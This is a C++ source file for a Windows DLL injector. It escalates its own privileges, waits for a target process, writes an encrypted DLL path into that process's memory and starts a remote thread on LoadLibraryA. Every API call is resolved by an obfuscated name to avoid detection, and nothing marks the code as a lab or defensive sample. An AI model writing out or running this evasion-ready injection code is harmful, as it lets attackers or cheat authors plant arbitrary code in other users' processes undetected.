#include <iostream>
#include <windows.h>
#include "utils.h"
#include "winapi_function_signatures.h"
#include "winapi_obfuscation.h"
#include "byte_encryption.h"

int main(int argc, char** argv)
{
	if (EscalatePrivilege() == -1)
	{
#ifdef _DEBUG
		std::cerr << "Failed to escalate privileges. The injection may not work!" << std::endl;
#endif 
		return 1;
	}

	DWORD procID = 0;
	while (!procID) // while the process was not found
	{
		procID = GetProcessIdByName(str_procName);
		resolve_dynamically<Sleep_t>(str_Sleep)(500);
	}
	HANDLE hProc = resolve_dynamically<OpenProcess_t>(str_OpenProcess)(PROCESS_ALL_ACCESS, 0, procID);

	if (hProc && hProc != INVALID_HANDLE_VALUE) // if we got a handle successfully
	{
		std::string dllPathString = string_decrypt(str_dllPath);
		LPVOID dllAddrInRemoteProcess = resolve_dynamically<VirtualAllocEx_t>(str_VirtualAllocEx)(hProc, NULL, strlen(dllPathString.c_str()) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		if (dllAddrInRemoteProcess) {
			resolve_dynamically<WriteProcessMemory_t>(str_WriteProcessMemory)(hProc, dllAddrInRemoteProcess, dllPathString.c_str(), strlen(dllPathString.c_str()) + 1, 0);
			wipeStr(dllPathString);
		}

		else
		{
			wipeStr(dllPathString);
#ifdef _DEBUG
			std::cout << "Error: VirtualAllocEx() returned NULL: Err #" << GetLastError() << std::endl;
#endif
			return 1;
		}

		LoadLibraryA_t LoadLibraryA_addr = resolve_dynamically<LoadLibraryA_t>(str_LoadLibraryA);
		HANDLE threadHandle = resolve_dynamically<CreateRemoteThread_t>(str_CreateRemoteThread)(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA_addr, dllAddrInRemoteProcess, 0, 0);

		if (threadHandle != NULL)
			resolve_dynamically<CloseHandle_t>(str_CloseHandle)(threadHandle);
#ifdef _DEBUG
		else
			std::cerr << "Error in CreateRemoteThread(): Err#" << GetLastError() << std::endl;
#endif

	}
#ifdef _DEBUG
	else {
		std::cerr << "Error in OpenProcess(): Err#" << GetLastError() << std::endl;
	}
#endif

	return 0;

}